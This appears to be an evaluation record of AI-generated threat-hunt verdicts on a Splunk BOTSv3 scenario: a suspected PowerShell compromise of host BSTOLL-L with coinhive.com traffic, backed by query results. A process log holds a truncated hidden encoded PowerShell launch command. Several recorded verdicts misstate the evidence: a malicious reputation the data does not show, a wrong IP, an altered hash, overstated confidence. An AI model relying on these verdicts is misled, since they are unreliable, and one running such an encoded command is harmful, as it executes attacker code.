# uncategorised#7 · query="index=botsv3 "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#8 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS by DNS.src, DNS.dest, DNS.query, DNS.answer, DNS.record_type earliest=-1s la…" · rows=0
(no rows returned)

# uncategorised#9 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffi…" · rows=0
(no rows returned)

# uncategorised#10 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic (All_Traffic.src="217.182.164.14" OR All_Traffic.dest="217.182.164.14")…" · rows=0
(no rows returned)

# uncategorised#11 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS (DNS.query="coinhive.com" OR DNS.answer="217.182.164.14") by DNS.src, DNS.de…" · rows=0
(no rows returned)

# uncategorised#12 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14" OR src="217.182.164.14" OR dest="217.182.164.14") | stats count by sourcetype, src_ip, dest_ip" · rows=3
sourcetype=WinEventLog src_ip=192.168.247.131 dest_ip=217.182.164.14 count=1
sourcetype=stream:ip src_ip=192.168.247.131 dest_ip=217.182.164.14 count=3
sourcetype=stream:tcp src_ip=192.168.247.131 dest_ip=217.182.164.14 count=2

# uncategorised#13 · query="index=botsv3 ("coinhive.com" OR "coinhive") | stats count by sourcetype" · rows=2
sourcetype=stream:dns count=28
sourcetype=syslog count=6

# uncategorised#14 · query="index=botsv3 sourcetype=WinEventLog (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by EventCode, src_ip, dest_ip, host, user" · rows=0
(no rows returned)

# uncategorised#15 · query="index=botsv3 sourcetype=syslog "coinhive.com" | stats count by host, src_ip, dest_ip, _raw" · rows=0
(no rows returned)
```

</details>

### endpoint

**shown #1** — stance `inconclusive`, confidence 0.20

> The evidence lacks confirmation of the specific malware hash's malicious status and does not provide concrete proof of the hypothesized outbound C2 communication, despite showing some unrelated DNS resolutions and generic PowerShell activity. No conclusive malicious indicators are present within the scope of the provided data.

- Generic PowerShell executions are noted but lack encoded command-line arguments suggesting malicious payload delivery or execution. [processes#12]

citations: `processes#12, uncategorised#12, uncategorised#13`

**shown #2** — stance `supports`, confidence 0.65

> Evidence includes two encoded PowerShell commands executed by user BudStoll (processes#12), suggesting potential malicious execution using obfuscation techniques. While no explicit C2 communication is observed in process logs, the presence of encoded PowerShell commands aligns with initial compromise stages described in the hypothesis.

- Two encoded PowerShell commands (processes#12) [encoded PowerShell command]

citations: `processes#12`

**shown #3** — stance `supports`, confidence 0.95

> The hypothesis claims compromise via PowerShell payload e2ac36894c2560c8b277ff9618b76c8c with C2 to 217.182.164.14 and coinhive.com. Evidence supports this:  
- Encoded PowerShell execution: processes#12 shows two instances of PowerShell (cmdline field truncated) with -enc flags and obfuscated base64 strings, indicating likely malicious payload execution.  
- Direct C2 validation: uncategorized#12 confirms network traffic to 217.182.164.14 (3 hits across WinEventLog, stream:ip, stream:tcp).  
- Coinhive.com validation: uncategorized#13 shows 28 DNS resolutions for coinhive.com (syslog/dns streams).

- Suspicious PowerShell execution with encoded commands [processes#12]

citations: `processes#12`

**shown #4** — stance `supports`, confidence 0.85

> Evidence shows encoded PowerShell commands (SQBmACgAJABQ...) executed by browser_broker.exe ([processes#12]), followed by DNS resolution for coinhive.com ([uncategorised#13]) and network traffic to 217.182.164.14 ([uncategorised#12]). These directly align with the hypothesis's claims of PowerShell malware execution and C2 communication.

- Encoded PowerShell command-line arguments detected ([processes#12]).

citations: `processes#12, uncategorised#12, uncategorised#13`

**shown #5** — stance `supports`, confidence 0.70

> The encoded PowerShell command (process#12) and subsequent network connections to coinhive.com (uncategorised#13) directly align with the hypothesis, indicating malicious activity consistent with C2 beaconing. The PowerShell execution timeline overlaps with the reported timeframe, and the destination IP (217.182.184.14) is confirmed in network traffic (uncategorised#12). While the file hash lacks explicit malicious flags (reputation#1), its "unknown" status does not negate the observed behavioral indicators of compromise.

- Encoded PowerShell command (-enc flag) in process#12 [processes#12]
- Outbound DNS resolution for coinhive.com (uncategorised#13)

citations: `processes#12, uncategorised#12, uncategorised#13`

**blind #1**, confidence 0.95

> The encoded PowerShell command (processes#12) uses -enc flag, indicating obfuscation common in attacks. Connections to coinhive.com (uncategorised#13) align with known cryptomining infrastructure, supported by repeated DNS resolutions and destination IPs.  

### CITATIONS: processes#12, uncategorised#13

- An encoded PowerShell command executed from a standard user context.
- [processes#12]
- Multiple DNS lookups and connections to a known cryptomining service (coinhive.com).
- [uncategorised#13]
- ### CONFIDENCE: 0.95
- ### RATIONALE:
- The encoded PowerShell command (processes#12) uses -enc flag, indicating obfuscation common in attacks. Connections to coinhive.com (uncategorised#13) align with known cryptomining infrastructure, supported by repeated DNS resolutions and destination IPs.
- ### CITATIONS: processes#12, uncategorised#13

citations: `processes#12, uncategorised#13`

**blind #2**, confidence 0.95

> The PowerShell process includes a base64-encoded command (-enc ...), indicating obfuscation commonly used for malicious scripts.

- Encoded PowerShell Command Execution
- [processes#12]

citations: `processes#12`

**blind #3**, confidence 0.85

> The unknown file hash warrants investigation due to its "unknown" reputation status. The encoded PowerShell commands suggest potential obfuscation, while the high volume of AppLocker events may indicate attempted application control bypass. The DNS activity targeting coinhive.com (known crypto-miner domain) strengthens suspicion of malicious activity.

- An unknown file hash (e2ac36894c2560d2b277ff9618b76c8c) exists in the environment [reputation#1]
- Two encoded PowerShell commands were executed from browser_broker.exe [processes#12]
- High-volume AppLocker-related events occurred during the timeline of suspicious activity [processes#6]
- DNS traffic involved coinhive.com and IP 217.182.164.14 [uncategorised#12]

citations: `processes#12, processes#6, reputation#1, uncategorised#12`

**blind #4**, confidence 1.00

> Negative reputation scores typically indicate known malicious files, making this a high-confidence finding.

- A file hash associated with negative reputation has been identified [reputation#1]

citations: `reputation#1`

**blind #5**, confidence 0.95

> Malicious file reputation, encoded PowerShell commands, suspicious process arguments, and external connections to known mining infrastructure indicate active compromise. Absence of process lineage or network metadata limits deeper analysis.

- A file hash e2ac36894c2560d2b277ff9618b76c8c has a negative reputation score ([reputation#1])
- Multiple encoded PowerShell commands were executed via powershell.exe ([processes#2] and [processes#12])
- Suspicious conhost.exe execution with symbolic link path [processes#11]
- Connections to coinhive.com and resolved IP 217.182.164.14 occurred ([uncategorised#12] and [uncategorised#13])

citations: `processes#11, processes#12, processes#2, reputation#1, uncategorised#12, uncategorised#13`

<details><summary>Evidence this domain was shown</summary>

```
# reputation#1 · source=virustotal · indicators=2
file_hash=e2ac36894c2560d2b277ff9618b76c8c unknown mal=0 susp=0 harmless=0 rep=-
file_hash=e2ac36894c2560d2b277ff9618b76c8c unknown mal=0 susp=0 harmless=0 rep=-

# processes#1 · query="index=botsv3 (host="BSTOLL-L" OR user="bostoll") sourcetype="WinEventLog:Sysmon" EventCode=1 earliest=1534723200 latest=1534809600 | stats count by host, User, …" · rows=0
(no rows returned)

# processes#2 · query="index=botsv3 (host="BSTOLL-L" OR user="bostoll") powershell earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=5
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=21
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=2
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=6
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=30
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=2

# processes#3 · query="index=botsv3 (host="BSTOLL-L" OR user="bostoll") (sourcetype="WinEventLog:Security" OR sourcetype="XmlWinEventLog:Security") EventCode=4688 earliest=1534723200 …" · rows=0
(no rows returned)

# processes#4 · query="index=botsv3 host="BSTOLL-L" sourcetype="xmlwineventlog" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 earliest=1534723200 latest=153480…" · rows=0
(no rows returned)

# processes#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="PerfmonMk:Process" powershell earliest=1534723200 latest=1534809600 | stats count by host, Name, ID, ParentProcessID" · rows=0
(no rows returned)

# processes#6 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" powershell earliest=1534723200 latest=1534809600 | stats count by host, Even…" · rows=6
- host=BSTOLL-L user=- process=- parent=- code=4659 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4663 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4688 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4688 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4689 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4689 cmdline=- count=1

# processes#7 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinHostMon" source="service" earliest=1534723200 latest=1534809600 | stats count by host, Name, DisplayName, State, Pat…" · rows=0
(no rows returned)

# processes#8 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | table…" · rows=50
2018-08-20T17:07:34.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T17:04:24.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:45.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:35.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:35.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:33.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:18.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:17.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:14.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:52:28.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:51:04.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:41:29.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:40:48.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:40:46.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:40:37.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:33:57.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
… (30 more rows not shown)

# processes#9 · query="index=botsv3 host="BSTOLL-L" sourcetype="PerfmonMk:Process" earliest=1534723200 latest=1534809600 | stats count by Name, ID, ParentProcessID | sort -count" · rows=0
(no rows returned)

# processes#10 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" powershell earliest=1534723200 latest=1534809…" · rows=2
2018-08-20T13:28:40.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8004 cmdline=-
2018-08-20T11:59:48.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8004 cmdline=-

# processes#11 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" (EventCode=4688 OR EventCode=4689) earliest=1534723200 latest=1534809600 | t…" · rows=100
2018-08-20T11:05:01.000+02:00 host=BSTOLL-L user=BudStoll process=- parent=- code=4689 cmdline=-
2018-08-20T11:05:01.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Windows\System32\backgroundTaskHost.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\svchost.exe parent=C:\Windows\System32\services.exe code=4688 cmdline=C:\Windows\system32\svchost.exe -k defragsvc
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\Defrag.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\Defrag.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Windows\system32\defrag.exe" -p 67c -s 00000000000003D0 -b C:
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=BudStoll process=- parent=- code=4689 cmdline=-
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BSTOLL-L$'] process=C:\Windows\System32\Speech_OneCore\common\SpeechModelDownload.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline=C:\Windows\system32\speech_onecore\common\SpeechModelDownload.exe
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Windows\System32\taskhostw.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline=taskhostw.exe Event
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe" -ServerName:Hx.IPC.Server
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2018.18051.17710.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2018.18051.17710.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe" -ServerName:App.AppXzst44mncqdg84v7sv6p7yznqwssy6f7f.mca
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Program Files (x86)\Microsoft Office\root\Office16\officebackgroundtaskhandler.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files (x86)\Microsoft Office\root\Office16\officebackgroundtaskhandler.exe"
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeC2RClient.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe" /frequentupdate SCHEDULEDTASK displaylevel=False
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\provtool.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline=C:\Windows\system32\ProvTool.exe /turn 5 /source LogonIdleTask
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\DiskSnapshot.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\servicing\TrustedInstaller.exe parent=C:\Windows\System32\services.exe code=4688 cmdline=C:\Windows\servicing\TrustedInstaller.exe
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['LOCAL SERVICE', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\sc.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1806.18062-0\MpCmdRun.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1806.18062-0\MpCmdRun.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1806.18062-0\MpCmdRun.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\dmclient.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
… (80 more rows not shown)

# processes#12 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" EventCode=4688 powershell earliest=1534723200 latest=1534809600 | table _tim…" · rows=2
2018-08-20T11:59:48.000+02:00 host=BSTOLL-L user=['BudStoll', '-'] process=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe parent=C:\Windows\System32\browser_broker.exe code=- cmdline="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApA…
2018-08-20T13:28:40.000+02:00 host=BSTOLL-L user=['BudStoll', '-'] process=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe parent=C:\Windows\System32\browser_broker.exe code=- cmdline="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApA…

# processes#13 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" (EventCode=4688 OR EventCode=4689) earliest=1534723200 latest=1534809600 | t…" · rows=0
(no rows returned)

# uncategorised#1 · query="| tstats summariesonly=t count from datamodel=Authentication where (Authentication.user="bostoll" OR Authentication.src="BSTOLL-L" OR Authentication.dest="BSTOL…" · rows=0
(no rows returned)

# uncategorised#2 · query="index=botsv3 (user="bostoll" OR user="bstoll" OR user="bstoll@froth.ly" OR user="BudStoll") (sourcetype=linux_secure OR sourcetype=syslog OR sourcetype="access_…" · rows=0
(no rows returned)

# uncategorised#3 · query="| tstats summariesonly=t count from datamodel=Endpoint.Processes where Processes.dest="BSTOLL-L" OR Processes.user="bostoll" by Processes.dest, Processes.user, …" · rows=0
(no rows returned)

# uncategorised#4 · query="index=botsv3 host="BSTOLL-L" e2ac36894c2560d2b277ff9618b76c8c earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | stats…" · rows=0
(no rows returned)

# uncategorised#6 · query="index=botsv3 host="BSTOLL-L" "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#7 · query="index=botsv3 "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#8 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS by DNS.src, DNS.dest, DNS.query, DNS.answer, DNS.record_type earliest=-1s la…" · rows=0
(no rows returned)

# uncategorised#9 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffi…" · rows=0
(no rows returned)

# uncategorised#10 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic (All_Traffic.src="217.182.164.14" OR All_Traffic.dest="217.182.164.14")…" · rows=0
(no rows returned)

# uncategorised#11 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS (DNS.query="coinhive.com" OR DNS.answer="217.182.164.14") by DNS.src, DNS.de…" · rows=0
(no rows returned)

# uncategorised#12 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14" OR src="217.182.164.14" OR dest="217.182.164.14") | stats count by sourcetype, src_ip, dest_ip" · rows=3
sourcetype=WinEventLog src_ip=192.168.247.131 dest_ip=217.182.164.14 count=1
sourcetype=stream:ip src_ip=192.168.247.131 dest_ip=217.182.164.14 count=3
sourcetype=stream:tcp src_ip=192.168.247.131 dest_ip=217.182.164.14 count=2

# uncategorised#13 · query="index=botsv3 ("coinhive.com" OR "coinhive") | stats count by sourcetype" · rows=2
sourcetype=stream:dns count=28
sourcetype=syslog count=6

# uncategorised#14 · query="index=botsv3 sourcetype=WinEventLog (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by EventCode, src_ip, dest_ip, host, user" · rows=0
(no rows returned)

# uncategorised#15 · query="index=botsv3 sourcetype=syslog "coinhive.com" | stats count by host, src_ip, dest_ip, _raw" · rows=0
(no rows returned)
```

</details>
